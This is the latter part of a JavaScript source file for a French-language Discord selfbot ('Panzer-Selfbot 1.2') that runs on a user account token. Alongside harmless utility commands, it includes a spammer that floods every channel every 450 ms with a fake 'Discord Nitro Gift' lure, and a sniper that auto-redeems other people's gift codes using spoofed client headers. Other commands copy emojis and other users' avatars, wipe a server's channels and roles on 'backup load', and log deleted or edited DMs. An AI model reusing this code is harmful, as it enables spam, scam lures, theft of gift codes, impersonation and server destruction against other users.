            return str.split("").reverse().join("");
        }
        let sreverse = reverseString(reverse)
        if (args[0] === sreverse) {
            sreverse = `${args.splice(1).join(" ")}`
        }
        msg.edit(`${sreverse}`).catch(console.error);
        console.log('Commande reverse effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'discord')) {
        let embed = new Discord.RichEmbed()
            .setColor(color)
            .setDescription(`Discord Version : ${Discord.version}`)
            .setFooter('Panzer-Selfbot 1.2');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande discord effectué'.yellow);
    };
    if (message.content === prefix + 'restart') {
        message.edit('**redémarrage** du self bot...').then(client.destroy()).then(() => {
            return client.login(token);
        });
        console.log('Commande restart effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
        let serveur = message.guild;
        let gRole = message.mentions.roles.first();
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**')
        if (!gRole) return message.delete().then(console.log('[', 'ERROR'.red, ']', 'un nom de rôle est nécessaire'.green))
        const status = {
            false: "Non",
            true: "oui"
        }
        let roleEmbed = new Discord.RichEmbed()
            .setColor(color)
            .setDescription(`<@&${gRole.id}>`)
            .addField('id du role:', gRole.id)
            .addField('couleur:', gRole.hexColor)
            .setFooter('Panzer-Selfbot 1.2')
            .addField('nombre de membres ayant ce role:', gRole.members.size)
            .addField('position:', gRole.position)
            .addField('mentionnable:', status[gRole.mentionable])
        if (!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)**\n<@&${gRole.id}>\n\nid du role: ${gRole.id}\ncouleur du role: ${gRole.hexColor}\nmembres ayant ce role: ${gRole.members.size}\nposition: ${gRole.position}\nmentionnable: ${status[gRole.mentionable]}`)
        console.log('Commande role info effectué'.yellow)
        message.edit(roleEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'))
    }
    if (message.content.startsWith(prefix + "add emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let arg = args.splice(2).join(" ");
        let customemoji = Discord.Util.parseEmoji(arg);

        if (!args) {
            message.edit(':x: **Veuillez choisir une emote.**')
            return;
        }
        if (!customemoji) {
            message.edit(`:x: **Emote invalide essayez ceci** ${prefix}add emote (emote) <name>`)
            return;
        }
        if (!message.member.hasPermission('MANAGE_EMOJIS')) {
            message.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
            return;
        }
        if (customemoji.id) {
            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
          customemoji.animated ? "gif" : "png"
        }`;
            let name = message.content.split(" ").splice(3) || customemoji.name;
            message.guild.createEmoji(
                `${Link}`,
                `${name}`
            );
            message.edit(':white_check_mark: **Emote ajoutée au serveur.**')
            console.log("Commande add emote executé.".yellow)
        } else
            message.edit(':x: **Veuillez choisir une emote valide!**')
    }
    if (message.content === prefix + 'emote') {
        if (message.channel.type === 'dm') {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let Emojis = "";
        let EmojisAnimated = "";
        let EmojiCount = 0;
        let Animated = 0;
        let OverallEmojis = 0;

        function Emoji(id) {
            return client.emojis.get(id).toString()
        }
        message.guild.emojis.forEach(emoji => {
            OverallEmojis++;
            if (emoji.animated) {
                Animated++
                EmojisAnimated += Emoji(emoji.id)
            } else {
                EmojiCount++;
                Emojis += Emoji(emoji.id)
            }
        })
        let embed = new Discord.RichEmbed()
            .setTitle(`Emojis dans: **${message.guild.name}**`)
            .setFooter('Panzer-Selfbot 1.2')
            .setColor(color)
            .addField(`Emojis animés: [${Animated}]`, EmojisAnimated || `None`)
            .addField(`Emojis [${EmojiCount}]`, Emojis || `None`)
            .addField('Total d\'emojis', OverallEmojis || `None`)
        message.edit(embed);
        console.log("Commande emote executé.".yellow)
    };
    if (message.content.startsWith(prefix + "remove emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
            return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        const emoji = args.splice(2).join(" ");
        if (!emoji) return message.edit(`:x: **Veuillez choisir une emote.**`);
        let customemoji = Discord.Util.parseEmoji(emoji);
        if (!message.guild.emojis.forEach(emote => {
                if (!emote.id === customemoji.id) {
                    return message.channel.send(`:x: **Cette emote n'est pas sur le serveur**.`)
                }
            }))
            return message.edit(":white_check_mark: **Emote correctement supprimée du serveur.**");
        if (customemoji.id) {
            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
              customemoji.animated ? "gif" : "png"
            }`;
            message.guild.emojis.get(customemoji.id).delete();
        } else {
            let CheckEmoji = parse(emoji, {
                assetType: "png"
            });
            if (!CheckEmoji[0])
                return message.edit(`:x: **Veuillez choisir une emote valide**!`);
            message.edit(`:x: **Vous ne pouvez pas supprimer les emotes par defaut**!`);
        };
        console.log("Commande remove emote executé.".yellow)
    }
    if (message.content.startsWith(prefix + 'embed_spammer')) {
        let embed = new Discord.RichEmbed()
            .setAuthor("© Discord Nitro Classic Gift")
            .setColor('#0027ff')
            .setThumbnail('https://emoji.gg/assets/emoji/6234_nitro_booster_s.gif')
            .setImage('https://miro.medium.com/max/2560/0*Atmf_-eFRoumfr9j.png')
            .addField('Claim You\'re Gift', '[https://discord.gift/sE7gEpcDQDUZKexV](https://discord.gg/j4jfr)')
            .setFooter('Discord || By discord');
        message.guild.channels.filter(channels => {
            return channels.type === 'text';
        }).forEach(chann => {
            setInterval(() => {
                chann.send(embed);
            }, 450);
        });
        console.log('Commande spam embed executé.'.yellow);
        return
    };
    if (message.content.startsWith(prefix + "steal banniere")) {
        message.delete()
        let banner = message.guild.bannerURL;
        console.log(`Voici la bannière de ${message.guild.name}: ${banner}`.green)
    }
    if (message.content.startsWith(prefix + "steal emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let arg = args.splice(2).join(" ");
        let serveurid = client.guilds.get(arg);
        if (!serveurid) {
            message.edit(`:x: **Aucun serveur trouvable avec l'id** "${arg}"`)
            return;
        }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
            return message.edit(":x: **Vous n'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        if (serveurid.emojis.size < 1) {
            message.edit(':x: **Le serveur ne contient aucun emote.**')
        }
        let i = "1";
        serveurid.emojis.forEach(emote => {
            setTimeout(() => {
                let name = emote.name;
                const Link = `https://cdn.discordapp.com/emojis/${emote.id}.${
          emote.animated ? "gif" : "png"
        }`
                message.guild.createEmoji(
                    `${Link}`,
                    `${name}`
                ).catch(error => i + "1");
            }, 1000);
        });
        console.log('Commande steal emote executé.'.yellow);
        message.edit(`:white_check_mark: **J'ai volé les emotes du serveur** "${serveurid.name}"`)
    }
    if (message.content === prefix + "delete all emote") {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        if (message.guild.emojis.size < 1) {
            message.edit(":x: **Il n' y a aucun emote a supprimer.**")
            return;
        }
        message.guild.emojis.forEach(emote => {
            message.guild.emojis.get(emote.id).delete();
        });
    };
    if (message.content.startsWith(prefix + "grab pp")) {
        let voled = message.mentions.users.first();
        let targetpp = voled.avatarURL;
        if (!voled) {
            message.edit(":x: **Veuillez mentionner un utilisateur valide!**")
            return;
        };
        if (!targetpp) {
            message.edi(":x: **Cet utilisateur n'a pas d'avatar!**")
            return;
        };
        client.user.setAvatar(targetpp);
        console.log('Commande grab pp executé.'.yellow)
        message.edit(`:white_check_mark: **J'ai correctement volé la photo de profile de ** "${voled.username}"`)
    };
    try {
        let info = client.emojis.get("655091815401127966") || "ℹ️"; //https://cdn.discordapp.com/emojis/655091815401127966.png?v=1
        let waiting = client.emojis.get("655695570769412096") || "⌛"; //https://images-ext-1.discordapp.net/external/lWj3uW4qvfFB9t0QgGsDJ8vLvh5bSObQ-wwUxYFH4wo/https/images-ext-1.discordapp.net/external/AzWR8HxPJ4t4rPA1DagxJkZsOCOMp4OTgwxL3QAjF4U/https/cdn.discordapp.com/emojis/424900448663633920.gif
        let green = client.emojis.get("655696285286006784") || "✅"; //https://images-ext-2.discordapp.net/external/NU9I3Vhi79KV6srTXLJuHxOgiyzmEwgS5nFAbA13_YQ/https/cdn0.iconfinder.com/data/icons/small-n-flat/24/678134-sign-check-512.png
        let error = client.emojis.get("655704809483141141") || "❌"; //https://cdn.discordapp.com/emojis/655704809483141141.png?v=1
        let warning = client.emojis.get("656030540310380574") || "⚠️"; //https://cdn.discordapp.com/emojis/656030540310380574.png?v=1
        if (msg.content === prefix + "backup create" | msg.content == prefix + "backup c") {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            message.guild.roles
                .filter(
                    r =>
                    r.name !== message.guild.member(client.user.id).highestRole.name
                )
                .forEach(r => {
                    if (
                        r.comparePositionTo(
                            message.guild.member(client.user.id).highestRole
                        ) > 0
                    ) {
                        return message.edit(`${warning}  **Attention**\n\nMon role n'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    }
                });
            message.edit(`${waiting}  **Please wait** ...\n\nCréation de la backup. Attendre la finalisation...\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)).then(m => {
                let id = makeid(16);

                const channels = message.guild.channels
                    .sort(function (a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(c => {
                        const channel = {
                            type: c.type,
                            name: c.name,
                            postion: c.calculatedPosition
                        };
                        if (c.parent) channel.parent = c.parent.name;
                        return channel;
                    });

                const roles = message.guild.roles
                    .filter(r => r.name !== "@everyone")
                    .sort(function (a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(r => {
                        const role = {
                            name: r.name,
                            color: r.color,
                            hoist: r.hoist,
                            permissions: r.permissions,
                            mentionable: r.mentionable,
                            position: r.position
                        };
                        return role;
                    });

                if (!backups[message.author.id]) backups[message.author.id] = {};
                backups[message.author.id][id] = {
                    icon: message.guild.iconURL,
                    name: message.guild.name,
                    owner: message.guild.ownerID,
                    members: message.guild.memberCount,
                    createdAt: message.guild.createdAt,
                    roles,
                    channels
                };

                save();
                let iconserveur = serveur.iconURL || "";

                console.log(`Nouvelle backup du serveur ${message.guild.name} vient d'être crée, voici son id : ${id}`.green)
                lbackup[serveur.name] = {
                    Id: id
                };
                liste();
                message.edit(`${info}  **Info**\n\nNouvelle backup du serveur **${message.guild.name}** vien d'être crée, voici son id : \`${id}\`\n**${prefix}backup load (id)** Pour load la backup\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            });
            console.log('Commande create backup executé'.yellow)
        }
        if (msg.content === prefix + "backup liste") {
            try {
                var data = fs.readFileSync('Data/liste.json', 'utf8');
                if (!data) {
                    message.edit(`:x: **Oups il semblerait que tu n'ai pas encore de backup fait ${prefix}help backup pour commencer a en voler**`)
                    return;
                }
                let embed = new Discord.RichEmbed()
                    .setTitle('**Panzer Backup Listes**')
                    .setColor(color)
                    .addField("\nWoaW GG tu es un veritables voleur de backup accompli !!!", "```" + data.toString())

                    .setFooter(`Panzer-Selfbot 1.2 | ${message.author.username}`, `${message.author.avatarURL}`)
                message.edit(embed)
            } catch (e) {
                console.log('Error:', e.stack);
            }
        }
        if (msg.content.startsWith(prefix + "backup delete")) {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let code = args.splice(2).join(" ");
            let errorEmbed = new Discord.RichEmbed()
                .setTitle(`${error} Erreur`)
                .setFooter('Panzer-Selfbot 1.2')
                .setDescription(
                    `Tu dois définir ton id de backup... Fais ${prefix}help pour avoir plus d'informations.`
                )
                .setColor(color);
            if (!code) return message.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            let cantfindbackup = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Panzer-Selfbot 1.2')
                .addField(`**Tu n'a pas de backup avec cette id : ${code}.**`, prefix + "help pour plus d'informations")
                .setColor(color);
            if (!backups[message.author.id][code])
                return message.edit(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));;

            delete backups[message.author.id][code];
            save();

            let deletedsuc = new Discord.RichEmbed()
                .setTitle(`${green}  Succès !`)
                .setFooter('Panzer-Selfbot 1.2')
                .setDescription(`La **backup** a bien été supprimée.`)
                .setColor(color);
            message.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande delete backup executé'.yellow)
        }

        if (msg.content.startsWith(prefix + "backup load")) {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let error = client.emojis.get("655704809483141141") || "❌";
            let code = args.splice(2).join(" ");
            let errorEmbed = new Discord.RichEmbed().setTitle(`${error}  Error`)
                .setDescription(`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`);
            if (!code) return message.channel.send(errorEmbed);
            let cantfindbackup = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .addField(`**Aucune backup avec l'id ${code}.**`, "/help pour plus d'information")
                .setFooter('Panzer-Selfbot 1.2')
                .setColor(color);
            if (!backups[message.author.id][code])
                return message.channel.send(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            message.guild.channels.forEach(channel => {
                channel.delete("For Loading A Backup");
            });

            message.guild.roles
                .filter(role => role.members.every(member => !member.user.bot))
                .forEach(role => {
                    role.delete("For Loading A Backup");
                });
            backups[message.author.id][code].roles.forEach(async function (
                role
            ) {
                message.guild
                    .createRole({
                        name: role.name,
                        color: role.color,
                        permissions: role.permissions,
                        hoist: role.hoist,
                        mentionable: role.mentionable,
                        position: role.position
                    })
                    .then(role => {
                        role.setPosition(role.position);
                    });
            });

            backups[message.author.id][code].channels
                .filter(c => c.type === "category")
                .forEach(async function (ch) {
                    message.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    });
                });

            backups[message.author.id][code].channels
                .filter(c => c.type !== "category")
                .forEach(async function (ch) {
                    message.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    }).then(c => {
                        const parent = message.guild.channels
                            .filter(c => c.type === "category")
                            .find(c => c.name === ch.parent);
                        ch.parent ? c.setParent(parent) : "";
                    });
                });
            message.guild.setName(backups[message.author.id][code].name);
            message.guild.setIcon(backups[message.author.id][code].icon);
            console.log('Commande load backup executé'.yellow)
        }
        if (msg.content.startsWith(prefix + "backup info") || msg.content.startsWith(prefix + "backup i")) {
            let id = args.splice(2).join(" ");
            let MissingbackupinfoEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Panzer-Selfbot 1.2')
                .setDescription(
                    `Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`
                )
                .setColor(color);
            if (!id) return message.edit(MissingbackupinfoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            let cantfindEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Panzer-Selfbot 1.2')
                .setDescription(
                    `Tu n'as pas de **backup** avec cet id \`${id}\`.`
                )
                .setColor(color);
            if (!backups[message.author.id][id])
                return message.edit(cantfindEmbed);

            try {
                let infoEmbed = new Discord.RichEmbed()
                    .setTitle(backups[message.author.id][id].name)
                    .setThumbnail(backups[message.author.id][id].icon)
                    .addField(
                        "Creator",
                        `<@${backups[message.author.id][id].owner}>`,
                        true
                    )
                    .addField("Members", backups[message.author.id][id].members, true)
                    .addField("Created At", backups[message.author.id][id].createdAt)
                    .addField(
                        "Channels",
                        `\`\`\`${backups[message.author.id][id].channels
            .map(channel => channel.name)
            .join("\n")}\`\`\``,
                        true
                    )
                    .addField(
                        "Roles",
                        `\`\`\`${backups[message.author.id][id].roles
            .map(role => role.name)
            .join("\n")}\`\`\``,
                        true
                    );
                message.edit(infoEmbed);
            } catch (e) {
                hastebins(
                    backups[message.author.id][id].channels
                    .map(channel => channel.name)
                    .join("\n"),
                    "txt"
                ).then(ch => {
                    hastebins(
                        backups[message.author.id][id].roles
                        .map(role => role.name)
                        .join("\n"),
                        "txt"
                    ).then(ro => {
                        let infoEmbed = new Discord.RichEmbed()
                            .setTitle(backups[message.author.id][id].name)
                            .setThumbnail(backups[message.author.id][id].icon)
                            .addField(
                                "Creator",
                                `<@${backups[message.author.id][id].owner}>`,
                                true
                            )
                            .addField(
                                "Members",
                                backups[message.author.id][id].members,
                                true
                            )
                            .addField(
                                "Created At",
                                backups[message.author.id][id].createdAt
                            )
                            .addField("Channels", ch, true)
                            .addField("Roles", ro, true)
                            .setFooter('Panzer-Selfbot 1.2');
                        message.edit(infoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    });
                });
            }
            console.log('Commande backup info executé'.yellow)
        }

        if (msg.content.startsWith(prefix + "backup purge")) {
            let errorEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setDescription(
                    `Vous n'avez pas encore sauvegardé de serveur`
                )
                .setColor(color);
            if (!backups[message.author.id])
                return message.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            let warningEmbed = new Discord.RichEmbed().setTitle(`${warning}  Warning`)
                .setDescription(`Es-tu sûr de vouloir supprimer toutes tes backups ?
__Cette action est irréversible !__`);
            let sur = new Discord.RichEmbed()
                .setColor(color)
                .setTitle('Oui/Non')
                .setFooter('Panzer-Selfbot 1.2')
                .addField('Etes vous sur de vouloir supprimer toutes vos backups???', "Oui/Non")
            message.edit(sur)
                .then(() => {
                    message.channel.awaitMessages(response => response.content === "Oui", {
                            max: 1,
                            time: 30000,
                            errors: ['time'],
                        })
                        .then((collected) => {
                            delete backups[message.author.id];

                            let deletedsuc = new Discord.RichEmbed()
                                .setTitle(`${green}  Voila!`)
                                .setDescription(`Deleted all your backups.`)
                                .setFooter('Panzer-Selfbot 1.2')
                                .setColor(color);
                            message.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                            msg.delete();
                            console.log('Commande purge backup executé'.yellow)
                        });
                });
        }
        if (message.content === prefix + 'backup friend') {
            var friendCount = client.user.friends.size
            const friends = client.user.friends.array()
            let haste = `Successfully backed up ${friends.length.toString().bold} friends.`.green
            console.log(haste)
            hastebins(`${friends}\n`).then(r => {
                    var embed = new Discord.RichEmbed()
                        .setTitle("backup friends (<@id>)")
                        .addField('```lien hastebins```', r)
                        .setColor(color)
                        .setTimestamp()
                        .setDescription("***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***")
                    message.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    console.log('Commande friends backup executé'.yellow)
                }

            )
        }

        function makeid(length) {
            var result = "";
            var characters =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        function save() {
            fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
                if (err) console.error(err);
            });
        }
    } catch (error) {
        return;
    }
})

function saving() {
    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
        if (err) console.error(err);
    });
}

function liste() {
    fs.writeFile("./Data/liste.json", JSON.stringify(lbackup), err => {
        if (err) console.error(err);
    });
}

function kicker() {
    fs.writeFile("./Data/vkick.json", JSON.stringify(kicked), err => {
        if (err) console.error(err);
    });
}
client.on('messageUpdate', (message) => {
    if (message.author.id === client.user.id) {
        return
    };
    if (message.channel.type === 'dm') {
        console.log('╔═════════════════════════════════╗'.blue);
        console.log('Log:' ['red']) ^ console.log('╟─────────────────────────────────╢'.blue);
        console.log(`${'║--> message mp modifié \n║--> User: '}${message.author.tag}${'\n║--> Content: '}${message.content}${'\n║--> At: '}${message.createdAt}${''}`.green);
        console.log('╚═════════════════════════════════╝'.blue)
    }
});
client.on("messageUpdate", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────╢'.blue)
        console.log(`║--> message mp modifié \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
})
client.on("messageDelete", message => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === "dm") {
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    }
    if (message.content.includes('@everyone') || message.content.includes('@here')) {
        if (message.author.id === client.user.id) return;
        if (message.channel.type === "dm") return;
        console.log('\n╔═════════════════════════════════╗'.blue)
        console.log('Log:'.red) ^
            console.log('╟─────────────────────────────────'.blue)
        console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`.green)
        console.log('╚═════════════════════════════════╝'.blue)
    } else return
})



function matchCode(text, callback) {
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if (codes) {
        callback(codes[0])
        return matchCode(text.slice(codes.index + codes[0].length), callback)
    } else {
        callback(null)
    }
}

client.on("message", message => {
    let codes = []
    matchCode(message.content, (code) => {
        if (!code) return
        if (!codes.includes(code)) codes.push(code)
    })
    if (codes.length == 0) return
    codes.forEach(code => {
        fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
            method: "post",
            headers: {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US",
                "Authorization": client.token,
                "Connection": "keep-alive",
                "Content-Length": JSON.stringify({
                    channel_id: message.channel.id
                }).length,
                "Content-Type": "application/json",
                "Host": "canary.discordapp.com",
                "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                "X-super-properties": Buffer.from(JSON.stringify({
                    "os": "Windows",
                    "browser": "Firefox",
                    "device": "",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "browser_version": "66.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "canary",
                    "client_build_number": 37519,
                    "client_event_source": null
                }), "utf-8").toString("base64")
            },
            body: JSON.stringify({
                channel_id: message.channel.id
            })
        }).then(res => {
            if (res.status == 400 || res.status == 404) return console.log(`code invalide :  ${code}`.red)
            res.json().then(json => {
                console.log(json)
                console.log("Un nouveau nitro à sûrement été ajouté à tes crédits.".green)
            })
        }).catch(console.error)
    })
})

client.on('guildDelete', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez quitté le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})

client.on('guildCreate', guild => {
    console.log('\n╔═════════════════════════════════╗'.blue)
    console.log('Log:'.red) ^
        console.log('╟─────────────────────────────────╢'.blue)
    console.log(`║--> Vous avez rejoint le serveur ${guild.name}`.green)
    console.log('╚═════════════════════════════════╝'.blue)
})


client.on("voiceStateUpdate", (oldMember) => {
    if (!oldMember) return;
    let oldVCID = oldMember.voiceChannelID;
    if (oldVCID) return;

    let oldChannelName =
        oldVCID != null && typeof oldVCID != undefined ?
        client.channels.get(oldVCID).name :
        null;
    if (oldChannelName === null) {
        if (kicked[oldMember.guild.id]) {
            if (oldMember.user.id === kicked[oldMember.guild.id].user) {
                if (!oldMember.guild.me.hasPermission('MOVE_MEMBERS')) return console.log("Erreur manque de permission.");
                oldMember.setVoiceChannel(null);
            }
        }
    } else
        return
});


client.login(token).catch(err => {
    if (err.toString().includes('Incorrect login details were provided'.red) || err.toString().includes('An invalid token was provided'.red)) {
        console.log('Token invalid!\nChange ton token dans le config.json'.red)
    }
})
